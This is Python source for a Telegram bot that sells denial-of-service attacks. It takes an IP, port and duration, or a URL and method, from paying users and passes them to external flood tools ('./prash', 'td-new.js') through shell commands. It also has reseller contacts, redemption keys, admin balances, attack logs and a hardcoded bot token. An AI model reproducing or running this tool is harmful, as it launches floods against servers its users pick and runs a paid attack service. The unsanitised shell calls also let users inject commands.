import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime, timedelta
import os
import subprocess
import time
import random
import string
import hashlib
import json
import requests
import uuid
import threading

# Replace with your bot token and owner IDs
TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
YOUR_OWNER_ID = 5628960731
YOUR_CO_OWNER_ID = 5090727892

bot = telebot.TeleBot("7990388947:AAG0OjpeMRLSfvmOD7pVgj_Ln1f37hJ1S_A")

# Paths to data files
USERS_FILE = 'users.txt'
BALANCE_FILE = 'balance.txt'
ADMINS_FILE = 'admins.txt'
ATTACK_LOGS_FILE = 'log.txt'
CO_OWNER_FILE = 'co_owner.txt'

# Initialize global variables
authorized_users = {}
user_balances = {}
admins = set()
bgmi_cooldown = {}
DEFAULT_COOLDOWN = timedelta(seconds=3)
MAX_ATTACK_DURATION = 500
otp_dict = {}
allowed_user_ids = set()
LOG_FILE = 'command_log.txt'


# Save co-owner to file
def save_YOUR_CO_OWNER_ID():
    with open(CO_OWNER_FILE, 'w') as file:
        file.write(str(YOUR_CO_OWNER_ID) if YOUR_CO_OWNER_ID else "")

# Save authorized users
def save_authorized_users():
    with open(USERS_FILE, 'w') as file:
        for user_id, info in authorized_users.items():
            expiry = info.get('expiry', 'No Expiry')
            expiry_str = expiry.isoformat() if isinstance(expiry, datetime) else expiry
            file.write(f"{user_id} {expiry_str}\n")

# Save admins
def save_admins():
    with open(ADMINS_FILE, 'w') as file:
        for admin in admins:
            file.write(f"{admin}\n")

# Save balances
def save_balances():
    with open(BALANCE_FILE, 'w') as file:
        for user_id, data in user_balances.items():
            file.write(f"{user_id} {data['balance']}\n")


# Start menu handler
@bot.message_handler(commands=['start', 'menu'])
def send_welcome(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn_attack = telebot.types.KeyboardButton('🚀 Attack')
    btn_attack_url = telebot.types.KeyboardButton('🌐 Attack URL')
    btn_info = telebot.types.KeyboardButton('ℹ️ My Info')
    btn_reselling = telebot.types.KeyboardButton('💼 Reselling Panel')
    
    markup.add(btn_attack, btn_attack_url)
    markup.add(btn_info, btn_reselling)

    welcome_message = (
        "🎉 Welcome to the Enhanced Attack Bot! 🎉\n\n"
        "Choose an option from the menu below:\n"
        "🚀 Attack: Launch an IP-based attack\n"
        "🌐 Attack URL: Initiate a URL-based attack\n"
        "ℹ️ My Info: View your account details\n"
        "💼 Reselling Panel: Access reselling options"
    )
    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)

# Log command to the file
def log_command(user_id, target, duration, method):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(ATTACK_LOGS_FILE, "a") as file:
        file.write(f"👤 User: {username}\n🎯 Target: {target}\n⏱️ Duration: {duration}\n🔧 Method: {method}\n🕒 Time: {datetime.now()}\n\n")

CHANNEL_ID = -1002201895980  # Channel ID

# Check if user is authorized
def is_user_authorized(user_id, chat_id):
    if user_id in {YOUR_OWNER_ID, YOUR_CO_OWNER_ID}:
        return True
    
    if user_id in authorized_users:
        user_info = authorized_users[user_id]
        expiry_date = user_info.get('expiry')
        if isinstance(expiry_date, str):
            expiry_date = datetime.fromisoformat(expiry_date)
        if isinstance(expiry_date, datetime):
            return expiry_date > datetime.now() or chat_id == CHANNEL_ID
    
    return chat_id == CHANNEL_ID

# Send dynamic status during attack
def send_dynamic_status(message_chat_id, message_id, target, duration, method):
    start_time = time.time()
    dots_count = 1
    status_base = "🔥 Status: Attack in progress"
    
    while time.time() - start_time < duration:
        time.sleep(1)
        dots = '.' * dots_count
        new_status = f"{status_base}{dots}"
        try:
            progress = min(int((time.time() - start_time) / duration * 100), 100)
            progress_bar = '█' * (progress // 10) + '▒' * (10 - progress // 10)
            bot.edit_message_text(
                text=f"🚀 Attack in Progress! 🚀\n\n"
                     f"🎯 Target: {target}\n"
                     f"⏱️ Duration: {duration} seconds\n"
                     f"🔧 Method: {method}\n\n"
                     f"{new_status}\n"
                     f"[{progress_bar}] {progress}%",
                chat_id=message_chat_id,
                message_id=message_id
            )
        except telebot.apihelper.ApiTelegramException:
            pass
        dots_count = (dots_count % 6) + 1

    try:
        bot.edit_message_text(
            text=f"✅ Attack Completed Successfully! ✅\n\n"
                 f"🎯 Target: {target}\n"
                 f"⏱️ Duration: {duration} seconds\n"
                 f"🔧 Method: {method}\n\n"
                 f"🔥 Status: Mission Accomplished 🔥",
            chat_id=message_chat_id,
            message_id=message_id
        )
    except telebot.apihelper.ApiTelegramException:
        pass

# Start attack reply
def start_attack_reply(message, target, duration, method):
    reply_message = (f"🚀 Attack Launched Successfully! 🚀\n\n"
                     f"🎯 Target: {target}\n"
                     f"⏱️ Duration: {duration} seconds\n"
                     f"🔧 Method: {method}\n\n"
                     f"🔥 Status: Initializing attack...")
    
    status_message = bot.send_message(message.chat.id, reply_message)
    
    thread = threading.Thread(
        target=send_dynamic_status,
        args=(message.chat.id, status_message.message_id, target, duration, method)
    )
    thread.start()

# Process attack button for IP/Port-based attack
@bot.message_handler(func=lambda message: message.text == '🚀 Attack')
def process_attack_details(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if is_user_authorized(user_id, chat_id):
        msg = bot.send_message(message.chat.id, "Please provide the details in the following format:\n<host> <port> <time>")
        bot.register_next_step_handler(msg, get_attack_details)
    else:
        response = """
🚨 Access Denied! 🚨

You've stumbled upon the gateway to ultimate power, but only the chosen few may enter. Are you ready to join the elite?

👑 Seek the Gatekeeper: Only @PRASHANTGODORWOT holds the key to unleash limitless power. Connect now to secure your access!

💎 Ascend to Greatness: Become a premium member and gain unrivaled attack capabilities.

🆘 Need Help? Our admins are standing by to elevate you to the next level of power.

⚡ Infinite Power Awaits! The battlefield is calling. With @PRASHANTGODORWOT by your side, nothing can stop you!
"""
        bot.reply_to(message, response, parse_mode="Markdown")

# Get attack details for IP/Port-based attack
def get_attack_details(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if is_user_authorized(user_id, chat_id):
        try:
            command = message.text.split()

            if len(command) == 3:
                IP = command[0]
                try:
                    PORT = int(command[1])
                    DURATION = int(command[2])
                except ValueError:
                    bot.reply_to(message, "❌ Error: Port and time must be integers.")
                    return

                if user_id in bgmi_cooldown and (datetime.now() - bgmi_cooldown[user_id]) < DEFAULT_COOLDOWN:
                    remaining_time = DEFAULT_COOLDOWN.total_seconds() - (
                        datetime.now() - bgmi_cooldown[user_id]
                    ).total_seconds()
                    bot.reply_to(
                        message,
                        f"⏳ Cooldown active. Please wait {remaining_time:.2f} seconds before launching another attack.",
                    )
                    return

                bgmi_cooldown[user_id] = datetime.now()
                log_command(user_id, f"{IP}:{PORT}", DURATION, "EXTREME-VIP")
                start_attack_reply(message, f"{IP}:{PORT}", DURATION, "EXTREME-VIP")

                full_command = f"./prash {IP} {PORT} {DURATION} 100"
                try:
                    subprocess.run(full_command, shell=True, check=True)
                except subprocess.CalledProcessError as e:
                    bot.reply_to(message, f"❌ Command execution failed: {str(e)}")
            else:
                bot.reply_to(message, "❌ Invalid format. Please use: <host> <port> <time>")
        except Exception as e:
            bot.reply_to(message, f"❌ An unexpected error occurred: {str(e)}")

# Process URL attack button
@bot.message_handler(func=lambda message: message.text == '🌐 Attack URL')
def process_url_attack_details(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if is_user_authorized(user_id, chat_id):
        msg = bot.send_message(message.chat.id, "Please provide the details in the following format:\n<url> <duration> <method>")
        bot.register_next_step_handler(msg, get_attack_url_details)
    else:
        response = """
🚨 Access Denied! 🚨

You've discovered the portal to unmatched power, but entry is restricted to the chosen few. Ready to join the ranks of the elite?

👑 Seek the Gatekeeper: Only @PRASHANTGODORWOT can grant you access to this realm of unlimited potential. Reach out now!

💎 Elevate Your Status: Become a premium member and unlock devastating attack capabilities.

🆘 Need Assistance? Our admins are here to guide you to the next echelon of power.

⚡ Limitless Power Beckons! The digital battlefield awaits your command. With @PRASHANTGODORWOT as your ally, victory is assured!
"""
        bot.reply_to(message, response, parse_mode="Markdown")

# Get attack details for URL-based attack
def get_attack_url_details(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if is_user_authorized(user_id, chat_id):
        try:
            command = message.text.split()

            if len(command) == 3:
                URL = command[0]
                try:
                    DURATION = int(command[1])
                    METHOD = command[2]
                except ValueError:
                    bot.reply_to(message, "❌ Error: Duration must be an integer.")
                    return

                if user_id in bgmi_cooldown and (datetime.now() - bgmi_cooldown[user_id]) < DEFAULT_COOLDOWN:
                    remaining_time = DEFAULT_COOLDOWN.total_seconds() - (datetime.now() - bgmi_cooldown[user_id]).total_seconds()
                    bot.reply_to(message, f"⏳ Cooldown active. Please wait {remaining_time:.2f} seconds before launching another attack.")
                    return

                bgmi_cooldown[user_id] = datetime.now()
                log_command(user_id, URL, DURATION, METHOD)
                start_attack_reply(message, URL, DURATION, METHOD)
                
                full_command = f"node td-new.js {URL} {DURATION} 30 3 HTTPS.txt {METHOD}"
                try:
                    subprocess.run(full_command, shell=True, check=True)
                except subprocess.CalledProcessError as e:
                    bot.reply_to(message, f"❌ Command execution failed: {str(e)}")
            else:
                bot.reply_to(message, "❌ Invalid format. Please use: <url> <duration> <method>")
        except Exception as e:
            bot.reply_to(message, f"❌ An unexpected error occurred: {str(e)}")

# New function to handle reselling panel
@bot.message_handler(func=lambda message: message.text == '💼 Reselling Panel')
def reselling_panel(message):
    bot.reply_to(message, "🔗 Contact our reselling team:\n\n"
                          "👤 @PRASAHANTGODORWOT\n"
                          "👤 @reflex2kk")

# Function to handle "ℹ️ My Info" button press
@bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
def my_info(message):
    user_id = message.from_user.id
    role = "User"
    if user_id == YOUR_OWNER_ID:
        role = "🚀 OWNER 🚀"
    elif user_id == YOUR_CO_OWNER_ID:
        role = "🛸 CO-OWNER 🛸"
    elif user_id in admins:
        role = "👑 Admin 👑"

    username = message.from_user.username if message.from_user.username else "Not Available"
    if user_id in authorized_users:
        expiry_info = authorized_users[user_id]
        if 'expiry' in expiry_info and isinstance(expiry_info['expiry'], str):
            formatted_date = expiry_info['expiry']
        else:
            formatted_date = "Invalid expiry date"
        response = (f"👤 User Info 👤\n\n"
                    f"🔖 Role: {role}\n"
                    f"🆔 User ID: <code>{user_id}</code>\n"
                    f"👤 Username: @{username}\n"
                    f"⏳ Approval Expiry: {formatted_date}")
    else:
        response = (f"👤 User Info 👤\n\n"
                    f"🔖 Role: {role}\n"
                    f"🆔 User ID: <code>{user_id}</code>\n"
                    f"👤 Username: @{username}\n"
                    f"⏳ Approval Status: Not Approved")
    
    bot.reply_to(message, response, parse_mode="HTML")

def parse_duration(duration_text):
    duration = int(duration_text[:-1])
    unit = duration_text[-1]
    if unit == 'd':
        return timedelta(days=duration)
    elif unit == 'h':
        return timedelta(hours=duration)
    elif unit == 'm':
        return timedelta(minutes=duration)
    else:
        raise ValueError("Invalid duration unit. Use 'd' for days, 'h' for hours, or 'm' for minutes.")

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "🔑 Please enter your redemption key:")
    bot.register_next_step_handler(message, process_key_step)

def process_key_step(message):
    chat_id = message.chat.id
    user_key = message.text.strip()
    
    success, duration, unit = login(user_key)
    if success:
        user_info = bot.get_chat(message.from_user.id)
        username = user_info.username if user_info.username else f"ID: {message.from_user.id}"
        bot.send_message(chat_id, f"✅ User @{username} (ID: {message.from_user.id}) has been approved for {duration} {unit}.")
        
        expiry_time = datetime.now() + timedelta(**{unit: duration})
        authorized_users[message.from_user.id] = {'expiry': expiry_time.isoformat()}
        save_authorized_users()
    else:
        bot.send_message(chat_id, f"❌ Failed to redeem key: {duration}")

@bot.message_handler(commands=['approve'])
def approve_user(message):
    if message.from_user.id in admins or message.from_user.id in {YOUR_OWNER_ID, YOUR_CO_OWNER_ID}:
        msg = bot.send_message(message.chat.id, "👤 Please specify the user ID and duration (e.g., '123456789 1d').")
        bot.register_next_step_handler(msg, process_approval)
    else:
        bot.send_message(message.chat.id, "🚫 You don't have permission to use this command.")

def process_approval(message):
    try:
        user_id_text, duration_text = message.text.split()
        user_id = int(user_id_text.strip())
        duration = parse_duration(duration_text)

        current_time = datetime.now()
        if user_id in authorized_users and isinstance(authorized_users[user_id], dict):
            existing_expiry = datetime.fromisoformat(authorized_users[user_id].get('expiry', current_time.isoformat()))
            new_expiry = max(current_time, existing_expiry) + duration
        else:
            new_expiry = current_time + duration

        authorized_users[user_id] = {'expiry': new_expiry.isoformat()}
        save_authorized_users()

        user_info = bot.get_chat(user_id)
        username = user_info.username if user_info.username else f"ID: {user_id}"
        bot.send_message(message.chat.id, f"✅ User @{username} (ID: {user_id}) has been approved for {duration_text}.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error processing approval: {str(e)}")

@bot.message_handler(commands=['removeapproval'])
def remove_approval(message):
    if message.from_user.id in admins or message.from_user.id in {YOUR_OWNER_ID, YOUR_CO_OWNER_ID}:
        msg = bot.send_message(message.chat.id, "👤 Please specify the user ID to remove approval (e.g., '123456789').")
        bot.register_next_step_handler(msg, process_remove_approval)
    else:
        bot.send_message(message.chat.id, "?? You don't have permission to use this command.")

def process_remove_approval(message):
    try:
        user_id = int(message.text.strip())

        if user_id in authorized_users:
            del authorized_users[user_id]
            save_authorized_users()
            bot.send_message(message.chat.id, f"✅ Approval removed for User ID: {user_id}.")
        else:
            bot.send_message(message.chat.id, "❌ User ID not found in the approved list.")
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid user ID format. Please provide a valid user ID.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ An error occurred: {str(e)}")

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "📜 Your Command Logs:\n\n" + "".join(user_logs)
                else:
                    response = "📭 No Command Logs Found For You."
        except FileNotFoundError:
            response = "📭 No command logs found."
    else:
        response = "🚫 You Are Not Authorized To Use This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id == str(YOUR_OWNER_ID) or message.from_user.id == YOUR_CO_OWNER_ID:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "📭 Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "🗑️ Logs Cleared Successfully"
        except FileNotFoundError:
            response = "📭 Logs are already cleared."
    else:
        response = "🚫 Only Admin Can Run This Command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    if message.from_user.id in {YOUR_OWNER_ID, YOUR_CO_OWNER_ID}:
        msg = bot.send_message(message.chat.id, "👑 Please specify the user ID and initial balance for the new admin (e.g., 'user_id balance').")
        bot.register_next_step_handler(msg, process_add_admin)
    else:
        bot.send_message(message.chat.id, "🚫 You don't have permission to use this command.")

def process_add_admin(message):
    try:
        user_id_text, balance_text = message.text.split(maxsplit=1)
        user_id = int(user_id_text.strip())
        balance = int(balance_text.strip())

        if user_id not in admins:
            admins.add(user_id)
            user_balances[user_id] = {'username': bot.get_chat(user_id).username or "Unknown", 'balance': balance}
            save_admins()
            save_balances()
            bot.send_message(message.chat.id, f"✅ User @{bot.get_chat(user_id).username or 'Unknown'} (ID: {user_id}) added as an admin with a balance of {balance}.")
        else:
            bot.send_message(message.chat.id, f"❗ User with ID {user_id} is already an admin.")
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid input format. Please try again with 'user_id balance' (e.g., '123456789 100').")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ An error occurred: {str(e)}")

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    if message.from_user.id in {YOUR_OWNER_ID, YOUR_CO_OWNER_ID}:
        msg = bot.send_message(message.chat.id, "👑 Please specify the user ID of the admin to remove.")
        bot.register_next_step_handler(msg, process_remove_admin)
    else:
        bot.send_message(message.chat.id, "🚫 You don't have permission to use this command.")

def process_remove_admin(message):
    try:
        user_id = int(message.text.strip())

        if user_id in admins:
            admins.remove(user_id)
            save_admins()
            bot.send_message(message.chat.id, f"✅ User with ID {user_id} has been removed from the admins.")
        else:
            bot.send_message(message.chat.id, "❌ User ID not found in the admin list.")
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid user ID format. Please provide a valid user ID.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ An error occurred: {str(e)}")

@bot.message_handler(commands=['addco'])
def add_co_owner(message):
    if message.from_user.id == YOUR_OWNER_ID:
        msg = bot.send_message(message.chat.id, "🛸 Please specify the user ID to add as co-owner (e.g., '123456789').")
        bot.register_next_step_handler(msg, process_add_co_owner)
    else:
        bot.send_message(message.chat.id, "🚫 You don't have permission to use this command.")

def process_add_co_owner(message):
    global YOUR_CO_OWNER_ID
    try:
        user_id = int(message.text.strip())
        YOUR_CO_OWNER_ID = user_id
        save_YOUR_CO_OWNER_ID()
        user_info = bot.get_chat(user_id)
        username = user_info.username if user_info.username else f"ID: {user_id}"
        bot.send_message(message.chat.id, f"✅ User @{username} (ID: {user_id}) has been added as co-owner.")
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid user ID format. Please provide a valid user ID.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ An error occurred: {str(e)}")

@bot.message_handler(commands=['removeco'])
def remove_co_owner(message):
    if message.from_user.id == YOUR_OWNER_ID:
        try:
            global YOUR_CO_OWNER_ID
            if YOUR_CO_OWNER_ID is not None:
                chat_info = bot.get_chat(YOUR_CO_OWNER_ID)
                username = chat_info.username or chat_info.first_name or chat_info.last_name or "User"
                YOUR_CO_OWNER_ID = None
                save_YOUR_CO_OWNER_ID()
                bot.send_message(message.chat.id, f"✅ User @{username} (ID: {chat_info.id}) has been removed as co-owner.")
            else:
                bot.send_message(message.chat.id, "❗ There is no co-owner to remove.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ An error occurred: {str(e)}")
    else:
        bot.send_message(message.chat.id, "🚫 You don't have permission to use this command.")

@bot.message_handler(commands=['alladmins'])
def list_all_admins(message):
    if message.from_user.id in {YOUR_OWNER_ID, YOUR_CO_OWNER_ID} or message.from_user.id in admins:
        if admins:
            response = "👑 List of all admins:\n\n"
            for admin_id in admins:
                user_info = bot.get_chat(admin_id)
                username = user_info.username if user_info.username else f"ID: {admin_id}"
                response += f"🆔 User ID: {admin_id}\n👤 Username: @{username}\n\n"
        else:
            response = "📭 No admins found."
    else:
        response = "🚫 You don't have permission to use this command."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['logs'])
def send_logs(message):
    if message.from_user.id in {YOUR_OWNER_ID, YOUR_CO_OWNER_ID} or message.from_user.id in admins:
        if os.path.exists(ATTACK_LOGS_FILE):
            with open(ATTACK_LOGS_FILE, 'r') as f:
                logs = f.read()
            bot.send_message(message.chat.id, f"📜 Attack logs:\n\n{logs}")
        else:
            bot.send_message(message.chat.id, "📭 No logs found.")
    else:
        bot.send_message(message.chat.id, "🚫 You don't have permission to use this command.")

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    if message.from_user.id in admins or message.from_user.id in {YOUR_OWNER_ID, YOUR_CO_OWNER_ID}:
        msg = bot.send_message(message.chat.id, "💰 Please specify the user ID and the amount to add (e.g., 'user_id amount').")
        bot.register_next_step_handler(msg, process_add_balance)
    else:
        bot.send_message(message.chat.id, "🚫 You don't have permission to use this command.")

def process_add_balance(message):
    try:
        user_id_text, amount_text = message.text.split(maxsplit=1)
        user_id = int(user_id_text.strip())
        amount = int(amount_text.strip())

        if user_id in user_balances:
            user_balances[user_id]['balance'] += amount
        else:
            username = "Unknown"
            user_balances[user_id] = {'username': username, 'balance': amount}

        save_balances()

        username = user_balances[user_id]['username']
        bot.send_message(message.chat.id, f"✅ Added {amount} balance to @{username} (ID: {user_id}).")
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid input format. Please try again with 'user_id amount' (e.g., '123456789 100').")

@bot.message_handler(commands=['removebalance'])
def remove_balance(message):
    if message.from_user.id in admins or message.from_user.id in {YOUR_OWNER_ID, YOUR_CO_OWNER_ID}:
        msg = bot.send_message(message.chat.id, "💰 Please specify the user ID and the amount to remove (e.g., 'user_id amount').")
        bot.register_next_step_handler(msg, process_remove_balance)
    else:
        bot.send_message(message.chat.id, "🚫 You don't have permission to use this command.")

def process_remove_balance(message):
    try:
        user_id_text, amount_text = message.text.split(maxsplit=1)
        user_id = int(user_id_text.strip())
        amount = int(amount_text.strip())

        if user_id in user_balances and user_balances[user_id]['balance'] >= amount:
            user_balances[user_id]['balance'] -= amount
            save_balances()
            username = user_balances[user_id]['username']
            bot.send_message(message.chat.id, f"✅ Removed {amount} balance from @{username} (ID: {user_id}).")
        else:
            bot.send_message(message.chat.id, "❌ Invalid user ID or insufficient balance.")
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid input format. Please try again with 'user_id amount' (e.g., '123456789 100').")

@bot.message_handler(commands=['allusers'])
def all_users(message):
    if message.from_user.id in admins or message.from_user.id in {YOUR_OWNER_ID, YOUR_CO_OWNER_ID}:
        if authorized_users:
            response = "📋 List of all authorized users:\n\n"
            for user_id, info in authorized_users.items():
                username = info.get('username', 'N/A')
                expiry = info.get('expiry', 'N/A')
                response += f"🆔 User ID: `{user_id}`\n"
                response += f"👤 Username: @{username}\n"
                response += f"⏳ Approval Expiry: {expiry}\n\n"
            bot.send_message(message.chat.id, response, parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "📭 No authorized users found.")
    else:
        bot.send_message(message.chat.id, "🚫 You don't have permission to use this command.")

@bot.message_handler(commands=['refresh'])
def refresh_data(message):
    user_id = message.from_user.id
    if user_id == YOUR_OWNER_ID:
        open(ATTACK_LOGS_FILE, 'w').close()
        
        global authorized_users, user_balances, admins, YOUR_CO_OWNER_ID
        authorized_users.clear()
        user_balances.clear()
        admins.clear()
        YOUR_CO_OWNER_ID = None

        save_authorized_users()
        save_admins()
        save_balances()
        save_YOUR_CO_OWNER_ID()

        bot.reply_to(message, "🔄 All logs and user data have been cleared.")
    else:
        bot.reply_to(message, "🚫 You do not have permission to refresh data.")

@bot.message_handler(commands=['admindashboard'])
def admin_dashboard(message):
    if message.from_user.id in {YOUR_OWNER_ID, YOUR_CO_OWNER_ID}:
        active_users = len(authorized_users)
        total_balance = sum(user['balance'] for user in user_balances.values())
        bot.send_message(
            message.chat.id,
            f"📊 Admin Dashboard:\n\n"
            f"👥 Active Users: {active_users}\n"
            f"💰 Total User Balance: {total_balance}"
        )
    else:
        bot.reply_to(message, "🚫 Access restricted to admin users.")

@bot.message_handler(commands=['leaderboard'])
def show_leaderboard(message):
    if not user_balances:
        bot.send_message(message.chat.id, "📭 No users found in the leaderboard.")
        return

    sorted_users = sorted(user_balances.items(), key=lambda x: x[1]['balance'], reverse=True)
    leaderboard_text = "🏆 Leaderboard 🏆\n\n"
    for i, (user_id, info) in enumerate(sorted_users, start=1):
        leaderboard_text += f"{i}. @{info['username']} - {info['balance']} units\n"

    bot.send_message(message.chat.id, leaderboard_text)

@bot.message_handler(commands=['checkbalance'])
def check_balance(message):
    user_id = message.from_user.id
    if user_id in user_balances:
        balance_info = user_balances[user_id]
        balance = balance_info['balance']
        response = f"💰 Balance Info 💰\n\n👤 User ID: {user_id}\n💵 Balance: {balance}"
    else:
        response = "❌ Balance information not found. Please ensure you are an approved user."
    bot.reply_to(message, response)

# Start polling
bot.infinity_polling(none_stop=True)